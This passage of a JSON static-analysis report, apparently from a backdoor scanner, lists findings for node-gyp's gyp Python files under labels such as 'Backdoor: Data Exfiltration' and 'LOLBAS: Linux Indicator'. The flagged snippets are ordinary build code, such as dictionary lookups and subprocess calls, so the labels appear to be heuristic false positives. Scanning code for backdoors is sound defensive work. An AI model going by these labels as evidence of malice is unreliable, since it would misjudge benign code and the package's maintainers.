                    "text": "    )\n\n    def __repr__(self):\n        name = self._properties.get(\"name\") or self._properties[\"target\"].Name()\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n",
                    "rendered": {
                      "text": "    )\n\n    def __repr__(self):\n        name = self._properties.get(\"name\") or self._properties[\"target\"].Name()\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n",
                      "markdown": "`    )\n\n    def __repr__(self):\n        name = self._properties.get(\"name\") or self._properties[\"target\"].Name()\n        return f\"<{self.__class__.__name__} {name!r} at 0x{id(self):x}>\"\n\n    def Name(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1873,
                  "startColumn": 44,
                  "endLine": 1873,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n        self._files_by_path = {}\n        self._files_by_xcfilelikeelement = {}\n        for pbxbuildfile in self._properties.get(\"files\", []):\n            self._AddBuildFileToDicts(pbxbuildfile)\n\n    def FileGroup(self, path):\n",
                    "rendered": {
                      "text": "\n        self._files_by_path = {}\n        self._files_by_xcfilelikeelement = {}\n        for pbxbuildfile in self._properties.get(\"files\", []):\n            self._AddBuildFileToDicts(pbxbuildfile)\n\n    def FileGroup(self, path):\n",
                      "markdown": "`\n        self._files_by_path = {}\n        self._files_by_xcfilelikeelement = {}\n        for pbxbuildfile in self._properties.get(\"files\", []):\n            self._AddBuildFileToDicts(pbxbuildfile)\n\n    def FileGroup(self, path):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1634,
                  "startColumn": 36,
                  "endLine": 1634,
                  "endColumn": 41,
                  "snippet": {
                    "text": "                # for unrecognized files not containing text.  Xcode seems to choose\n                # based on content.\n                file_type = extension_map.get(ext, \"text\")\n                prop_name = prop_map.get(ext, \"lastKnownFileType\")\n\n            self._properties[prop_name] = file_type\n\n",
                    "rendered": {
                      "text": "                # for unrecognized files not containing text.  Xcode seems to choose\n                # based on content.\n                file_type = extension_map.get(ext, \"text\")\n                prop_name = prop_map.get(ext, \"lastKnownFileType\")\n\n            self._properties[prop_name] = file_type\n\n",
                      "markdown": "`                # for unrecognized files not containing text.  Xcode seems to choose\n                # based on content.\n                file_type = extension_map.get(ext, \"text\")\n                prop_name = prop_map.get(ext, \"lastKnownFileType\")\n\n            self._properties[prop_name] = file_type\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1633,
                  "startColumn": 41,
                  "endLine": 1633,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                # TODO(mark): \"text\" is the default value, but \"file\" is appropriate\n                # for unrecognized files not containing text.  Xcode seems to choose\n                # based on content.\n                file_type = extension_map.get(ext, \"text\")\n                prop_name = prop_map.get(ext, \"lastKnownFileType\")\n\n            self._properties[prop_name] = file_type\n",
                    "rendered": {
                      "text": "                # TODO(mark): \"text\" is the default value, but \"file\" is appropriate\n                # for unrecognized files not containing text.  Xcode seems to choose\n                # based on content.\n                file_type = extension_map.get(ext, \"text\")\n                prop_name = prop_map.get(ext, \"lastKnownFileType\")\n\n            self._properties[prop_name] = file_type\n",
                      "markdown": "`                # TODO(mark): \"text\" is the default value, but \"file\" is appropriate\n                # for unrecognized files not containing text.  Xcode seems to choose\n                # based on content.\n                file_type = extension_map.get(ext, \"text\")\n                prop_name = prop_map.get(ext, \"lastKnownFileType\")\n\n            self._properties[prop_name] = file_type\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1215,
                  "startColumn": 42,
                  "endLine": 1215,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            self._children_by_path[child_path] = child\n\n        if isinstance(child, PBXVariantGroup):\n            child_name = child._properties.get(\"name\", None)\n            key = (child_name, child_path)\n            if key in self._variant_children_by_name_and_path:\n                raise ValueError(\n",
                    "rendered": {
                      "text": "            self._children_by_path[child_path] = child\n\n        if isinstance(child, PBXVariantGroup):\n            child_name = child._properties.get(\"name\", None)\n            key = (child_name, child_path)\n            if key in self._variant_children_by_name_and_path:\n                raise ValueError(\n",
                      "markdown": "`            self._children_by_path[child_path] = child\n\n        if isinstance(child, PBXVariantGroup):\n            child_name = child._properties.get(\"name\", None)\n            key = (child_name, child_path)\n            if key in self._variant_children_by_name_and_path:\n                raise ValueError(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1194,
                  "startColumn": 37,
                  "endLine": 1194,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        # hashable : a node could have two child PBXGroup sharing a common name.\n        # To add entropy the hashable is enhanced with the names of all its\n        # children.\n        for child in self._properties.get(\"children\", []):\n            child_name = child.Name()\n            if child_name is not None:\n                hashables.append(child_name)\n",
                    "rendered": {
                      "text": "        # hashable : a node could have two child PBXGroup sharing a common name.\n        # To add entropy the hashable is enhanced with the names of all its\n        # children.\n        for child in self._properties.get(\"children\", []):\n            child_name = child.Name()\n            if child_name is not None:\n                hashables.append(child_name)\n",
                      "markdown": "`        # hashable : a node could have two child PBXGroup sharing a common name.\n        # To add entropy the hashable is enhanced with the names of all its\n        # children.\n        for child in self._properties.get(\"children\", []):\n            child_name = child.Name()\n            if child_name is not None:\n                hashables.append(child_name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1183,
                  "startColumn": 37,
                  "endLine": 1183,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        XCHierarchicalElement.__init__(self, properties, id, parent)\n        self._children_by_path = {}\n        self._variant_children_by_name_and_path = {}\n        for child in self._properties.get(\"children\", []):\n            self._AddChildToDicts(child)\n\n    def Hashables(self):\n",
                    "rendered": {
                      "text": "        XCHierarchicalElement.__init__(self, properties, id, parent)\n        self._children_by_path = {}\n        self._variant_children_by_name_and_path = {}\n        for child in self._properties.get(\"children\", []):\n            self._AddChildToDicts(child)\n\n    def Hashables(self):\n",
                      "markdown": "`        XCHierarchicalElement.__init__(self, properties, id, parent)\n        self._children_by_path = {}\n        self._variant_children_by_name_and_path = {}\n        for child in self._properties.get(\"children\", []):\n            self._AddChildToDicts(child)\n\n    def Hashables(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 901,
                  "startColumn": 48,
                  "endLine": 901,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n        # If the property doesn't exist yet, create a new empty list to receive the\n        # item.\n        self._properties[key] = self._properties.get(key, [])\n\n        # Set up the ownership link.\n        if is_strong:\n",
                    "rendered": {
                      "text": "\n        # If the property doesn't exist yet, create a new empty list to receive the\n        # item.\n        self._properties[key] = self._properties.get(key, [])\n\n        # Set up the ownership link.\n        if is_strong:\n",
                      "markdown": "`\n        # If the property doesn't exist yet, create a new empty list to receive the\n        # item.\n        self._properties[key] = self._properties.get(key, [])\n\n        # Set up the ownership link.\n        if is_strong:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 367,
                  "startColumn": 7,
                  "endLine": 367,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        ninja_targets = [\n            os.path.join(project_dir, filename) + \"^^\" for filename in selected_files\n        ]\n        cmd = [\"ninja.exe\"]\n        cmd.extend(ninja_targets)\n        return subprocess.call(cmd, shell=True, cwd=BASE_DIR)\n\n",
                    "rendered": {
                      "text": "        ninja_targets = [\n            os.path.join(project_dir, filename) + \"^^\" for filename in selected_files\n        ]\n        cmd = [\"ninja.exe\"]\n        cmd.extend(ninja_targets)\n        return subprocess.call(cmd, shell=True, cwd=BASE_DIR)\n\n",
                      "markdown": "`        ninja_targets = [\n            os.path.join(project_dir, filename) + \"^^\" for filename in selected_files\n        ]\n        cmd = [\"ninja.exe\"]\n        cmd.extend(ninja_targets)\n        return subprocess.call(cmd, shell=True, cwd=BASE_DIR)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 349,
                  "startColumn": 7,
                  "endLine": 349,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    def ExecActionWrapper(self, arch, rspfile, *dir):\n        \"\"\"Runs an action command line from a response file using the environment\n    for |arch|. If |dir| is supplied, use that as the working directory.\"\"\"\n        env = self._GetEnv(arch)\n        # TODO(scottmg): This is a temporary hack to get some specific variables\n        # through to actions that are set after gyp-time. http://crbug.com/333738.\n        for k, v in os.environ.items():\n",
                    "rendered": {
                      "text": "    def ExecActionWrapper(self, arch, rspfile, *dir):\n        \"\"\"Runs an action command line from a response file using the environment\n    for |arch|. If |dir| is supplied, use that as the working directory.\"\"\"\n        env = self._GetEnv(arch)\n        # TODO(scottmg): This is a temporary hack to get some specific variables\n        # through to actions that are set after gyp-time. http://crbug.com/333738.\n        for k, v in os.environ.items():\n",
                      "markdown": "`    def ExecActionWrapper(self, arch, rspfile, *dir):\n        \"\"\"Runs an action command line from a response file using the environment\n    for |arch|. If |dir| is supplied, use that as the working directory.\"\"\"\n        env = self._GetEnv(arch)\n        # TODO(scottmg): This is a temporary hack to get some specific variables\n        # through to actions that are set after gyp-time. http://crbug.com/333738.\n        for k, v in os.environ.items():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 7,
                  "endLine": 332,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    def ExecRcWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of rc.exe. Older versions of RC\n    don't support the /nologo flag.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                    "rendered": {
                      "text": "    def ExecRcWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of rc.exe. Older versions of RC\n    don't support the /nologo flag.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                      "markdown": "`    def ExecRcWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of rc.exe. Older versions of RC\n    don't support the /nologo flag.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 314,
                  "startColumn": 7,
                  "endLine": 314,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n    def ExecAsmWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of asm.exe.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                    "rendered": {
                      "text": "\n    def ExecAsmWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of asm.exe.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                      "markdown": "`\n    def ExecAsmWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of asm.exe.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 295,
                  "startColumn": 7,
                  "endLine": 295,
                  "endColumn": 12,
                  "snippet": {
                    "text": "                idl,\n            ]\n        )\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                    "rendered": {
                      "text": "                idl,\n            ]\n        )\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                      "markdown": "`                idl,\n            ]\n        )\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 7,
                  "endLine": 251,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        \"\"\"Run manifest tool with environment set. Strip out undesirable warning\n    (some XML blocks are recognized by the OS loader, but not the manifest\n    tool).\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                    "rendered": {
                      "text": "        \"\"\"Run manifest tool with environment set. Strip out undesirable warning\n    (some XML blocks are recognized by the OS loader, but not the manifest\n    tool).\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                      "markdown": "`        \"\"\"Run manifest tool with environment set. Strip out undesirable warning\n    (some XML blocks are recognized by the OS loader, but not the manifest\n    tool).\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 121,
                  "startColumn": 7,
                  "endLine": 121,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    '   Creating library ui.dll.lib and object ui.dll.exp'\n    This happens when there are exports from the dll or exe.\n    \"\"\"\n        env = self._GetEnv(arch)\n        if use_separate_mspdbsrv == \"True\":\n            self._UseSeparateMspdbsrv(env, args)\n        if sys.platform == \"win32\":\n",
                    "rendered": {
                      "text": "    '   Creating library ui.dll.lib and object ui.dll.exp'\n    This happens when there are exports from the dll or exe.\n    \"\"\"\n        env = self._GetEnv(arch)\n        if use_separate_mspdbsrv == \"True\":\n            self._UseSeparateMspdbsrv(env, args)\n        if sys.platform == \"win32\":\n",
                      "markdown": "`    '   Creating library ui.dll.lib and object ui.dll.exp'\n    This happens when there are exports from the dll or exe.\n    \"\"\"\n        env = self._GetEnv(arch)\n        if use_separate_mspdbsrv == \"True\":\n            self._UseSeparateMspdbsrv(env, args)\n        if sys.platform == \"win32\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 37,
                  "endLine": 93,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        open(path, \"w\").close()\n\n    def ExecRecursiveMirror(self, source, dest):\n        \"\"\"Emulation of rm -rf out && cp -af in out.\"\"\"\n        if os.path.exists(dest):\n            if os.path.isdir(dest):\n\n",
                    "rendered": {
                      "text": "        open(path, \"w\").close()\n\n    def ExecRecursiveMirror(self, source, dest):\n        \"\"\"Emulation of rm -rf out && cp -af in out.\"\"\"\n        if os.path.exists(dest):\n            if os.path.isdir(dest):\n\n",
                      "markdown": "`        open(path, \"w\").close()\n\n    def ExecRecursiveMirror(self, source, dest):\n        \"\"\"Emulation of rm -rf out && cp -af in out.\"\"\"\n        if os.path.exists(dest):\n            if os.path.isdir(dest):\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 349,
                  "startColumn": 8,
                  "endLine": 349,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    def ExecActionWrapper(self, arch, rspfile, *dir):\n        \"\"\"Runs an action command line from a response file using the environment\n    for |arch|. If |dir| is supplied, use that as the working directory.\"\"\"\n        env = self._GetEnv(arch)\n        # TODO(scottmg): This is a temporary hack to get some specific variables\n        # through to actions that are set after gyp-time. http://crbug.com/333738.\n        for k, v in os.environ.items():\n",
                    "rendered": {
                      "text": "    def ExecActionWrapper(self, arch, rspfile, *dir):\n        \"\"\"Runs an action command line from a response file using the environment\n    for |arch|. If |dir| is supplied, use that as the working directory.\"\"\"\n        env = self._GetEnv(arch)\n        # TODO(scottmg): This is a temporary hack to get some specific variables\n        # through to actions that are set after gyp-time. http://crbug.com/333738.\n        for k, v in os.environ.items():\n",
                      "markdown": "`    def ExecActionWrapper(self, arch, rspfile, *dir):\n        \"\"\"Runs an action command line from a response file using the environment\n    for |arch|. If |dir| is supplied, use that as the working directory.\"\"\"\n        env = self._GetEnv(arch)\n        # TODO(scottmg): This is a temporary hack to get some specific variables\n        # through to actions that are set after gyp-time. http://crbug.com/333738.\n        for k, v in os.environ.items():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 332,
                  "startColumn": 8,
                  "endLine": 332,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    def ExecRcWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of rc.exe. Older versions of RC\n    don't support the /nologo flag.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                    "rendered": {
                      "text": "    def ExecRcWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of rc.exe. Older versions of RC\n    don't support the /nologo flag.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                      "markdown": "`    def ExecRcWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of rc.exe. Older versions of RC\n    don't support the /nologo flag.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 314,
                  "startColumn": 8,
                  "endLine": 314,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n    def ExecAsmWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of asm.exe.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                    "rendered": {
                      "text": "\n    def ExecAsmWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of asm.exe.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                      "markdown": "`\n    def ExecAsmWrapper(self, arch, *args):\n        \"\"\"Filter logo banner from invocations of asm.exe.\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 295,
                  "startColumn": 8,
                  "endLine": 295,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                idl,\n            ]\n        )\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                    "rendered": {
                      "text": "                idl,\n            ]\n        )\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                      "markdown": "`                idl,\n            ]\n        )\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 8,
                  "endLine": 251,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        \"\"\"Run manifest tool with environment set. Strip out undesirable warning\n    (some XML blocks are recognized by the OS loader, but not the manifest\n    tool).\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                    "rendered": {
                      "text": "        \"\"\"Run manifest tool with environment set. Strip out undesirable warning\n    (some XML blocks are recognized by the OS loader, but not the manifest\n    tool).\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n",
                      "markdown": "`        \"\"\"Run manifest tool with environment set. Strip out undesirable warning\n    (some XML blocks are recognized by the OS loader, but not the manifest\n    tool).\"\"\"\n        env = self._GetEnv(arch)\n        popen = subprocess.Popen(\n            args, shell=True, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/win_tool.py"
                },
                "region": {
                  "startLine": 121,
                  "startColumn": 8,
                  "endLine": 121,
                  "endColumn": 23,
                  "snippet": {
